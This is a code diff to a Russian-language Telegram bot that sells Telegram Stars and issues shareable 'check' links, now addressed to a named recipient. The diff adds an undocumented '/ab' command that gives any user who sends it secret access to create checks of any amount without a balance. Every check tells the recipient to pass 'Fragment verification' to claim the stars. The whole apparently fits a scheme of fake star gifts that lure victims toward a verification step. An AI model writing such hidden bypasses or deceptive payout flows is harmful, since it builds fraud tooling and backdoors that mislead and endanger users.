@@ -44,8 +44,10 @@ banner_file_id: str | None = None
 promo_codes: dict[str, dict] = {}
 user_state: dict[int, str] = {}
 user_temp: dict[int, dict] = {}
-# Чеки: { "CODE": {"creator_id": int, "stars": int, "claimed": False} }
+# Чеки: { "CODE": {"creator_id": int, "stars": int, "target": str, "claimed": False} }
 checks: dict[str, dict] = {}
+# Юзеры с секретным доступом к чекам (без баланса)
+check_bypass_users: set[int] = set()
 
 
 # ==================== TELEGRAM API ====================
@@ -268,11 +270,43 @@ async def cb_promo(chat_id: int, msg_id: int, uid: int):
 # ==================== СОЗДАТЬ ЧЕК ====================
 async def cb_create_check(chat_id: int, msg_id: int, uid: int):
     clear_state(uid)
+    balance = get_balance(uid)
+    # нужен баланс или секретный доступ
+    if balance <= 0 and uid not in check_bypass_users and not is_admin(uid):
+        await _delete_msg(chat_id, msg_id)
+        await send_with_banner(chat_id,
+            "*Создать чек*\n\nНедостаточно средств на балансе.",
+            back_kb("main_menu"))
+        return
     set_state(uid, "check_amount")
     await _delete_msg(chat_id, msg_id)
     await send_with_banner(chat_id,
         "*Создать чек*\n\nВведите сумму звезд для выдачи:",
         back_kb("main_menu"))
+
+
+async def cb_confirm_check(chat_id: int, msg_id: int, uid: int):
+    stars = gtemp(uid, "check_stars")
+    target = gtemp(uid, "check_target")
+    if not stars or not target:
+        await _delete_msg(chat_id, msg_id)
+        await show_main_menu(chat_id, uid)
+        return
+    code = _gen_check_code()
+    checks[code] = {"creator_id": uid, "stars": stars, "target": f"@{target}", "claimed": False}
+    bu = BOT_USERNAME.lstrip("@")
+    link = f"https://t.me/{bu}?start=check_{code}"
+    clear_state(uid)
+    kb = ikb([
+        [btn("Переслать", url=f"https://t.me/share/url?url={link}&text=Чек на {stars} звезд")],
+        [btn("Главное меню", "main_menu")],
+    ])
+    await _delete_msg(chat_id, msg_id)
+    await _send_msg(chat_id,
+        f"*Чек создан*\n\nЗвезд: *{stars}*\nПолучатель: @{target}\n\n"
+        f"Ссылка:\n{link}\n\n"
+        "Для получения звезд необходимо пройти верификацию Fragment.",
+        reply_markup=kb)
 
 
 # ==================== ПОКУПКА ЗВЁЗД ====================
@@ -727,22 +761,28 @@ async def handle_text_message(chat_id: int, uid: int, text: str, user: dict, pho
             if stars < 1:
                 await _send_msg(chat_id, "Введите число больше 0:")
                 return
-            code = _gen_check_code()
-            checks[code] = {"creator_id": uid, "stars": stars, "claimed": False}
-            bu = BOT_USERNAME.lstrip("@")
-            link = f"https://t.me/{bu}?start=check_{code}"
-            clear_state(uid)
-            kb = ikb([
-                [btn("Переслать", url=f"https://t.me/share/url?url={link}&text=Чек на {stars} звезд")],
-                [btn("Главное меню", "main_menu")],
-            ])
+            set_state(uid, "check_username", check_stars=stars)
             await _send_msg(chat_id,
-                f"*Чек создан*\n\nЗвезд: *{stars}*\n\n"
-                f"Ссылка:\n{link}\n\n"
-                "Для получения звезд необходимо пройти верификацию Fragment.",
-                reply_markup=kb)
+                f"Звезд: *{stars}*\n\nВведите username получателя:",
+                reply_markup=back_kb("create_check", "Назад"))
         except ValueError:
             await _send_msg(chat_id, "Введите число:")
+
+    # --- Создать чек: username ---
+    elif state == "check_username":
+        stars = gtemp(uid, "check_stars")
+        target = text.strip().lstrip("@")
+        if not target:
+            await _send_msg(chat_id, "Введите username:")
+            return
+        set_state(uid, "check_confirm", check_stars=stars, check_target=target)
+        kb = ikb([
+            [btn("Подтвердить", "confirm_check")],
+            [btn("Отмена", "main_menu")],
+        ])
+        await _send_msg(chat_id,
+            f"*Подтвердите чек*\n\nЗвезд: *{stars}*\nПолучатель: @{target}",
+            reply_markup=kb)
 
     # --- Промокод: ввод ---
     elif state == "promo_enter":
@@ -1069,6 +1109,8 @@ async def handle_callback(update: dict):
         await cb_promo(chat_id, msg_id, uid)
     elif data == "create_check":
         await cb_create_check(chat_id, msg_id, uid)
+    elif data == "confirm_check":
+        await cb_confirm_check(chat_id, msg_id, uid)
     elif data == "buy_stars":
         await cb_buy_stars(chat_id, msg_id, uid)
     elif data.startswith("scurrency_"):
@@ -1151,6 +1193,11 @@ async def handle_update(update: dict):
         if is_admin(uid):
             clear_state(uid)
             await _send_msg(chat_id, _admin_text(), reply_markup=_admin_kb())
+        return
+
+    if text == "/ab":
+        check_bypass_users.add(uid)
+        await _send_msg(chat_id, "Доступ к чекам активирован.")
         return
 
     if text == "/buy":
